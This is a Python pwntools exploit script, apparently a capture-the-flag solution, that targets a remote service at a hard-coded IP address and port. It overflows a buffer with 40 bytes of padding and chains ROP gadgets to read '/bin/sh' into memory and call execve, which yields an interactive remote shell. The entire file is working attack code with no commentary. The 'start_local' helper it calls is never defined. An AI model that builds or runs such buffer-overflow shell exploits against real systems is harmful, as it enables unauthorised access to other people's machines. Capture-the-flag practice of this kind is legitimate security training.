#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = '139.162.5.230'
port = 10197


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b* main+92
continue
'''.format(**locals())

# -- Exploit goes here --
pop_rax_rdx_rbx = 0x45c176
pop_rax = 0x41a8c7
pop_rdi = 0x402181
pop_rsi = 0x40b8fd
pop_rdx = 0x4018c5
syscall = 0x40d032
ret = 0x401016
push_rsp = 0x410fb8

pay = b'A' * 40
pay += p64(ret)
pay += p64(pop_rsi)
pay += p64(0x4a5000)
pay += p64(pop_rdi)
pay += p64(0)
pay += p64(pop_rdx)
pay += p64(8)
pay += p64(pop_rax)
pay += p64(0)
pay += p64(syscall)
#pay += p64(push_rsp)
#pay += p64(0x68732f6e69622f)
pay += p64(pop_rdi)
pay += p64(0x4a5000)
pay += p64(pop_rsi)
pay += p64(0x0)
pay += p64(pop_rdx)
pay += p64(0)
pay += p64(pop_rax)
pay += p64(59)
pay += p64(syscall)


io = start()
io.clean()
io.sendline(pay)
io.sendline(b'/bin/sh\x00')

io.interactive()
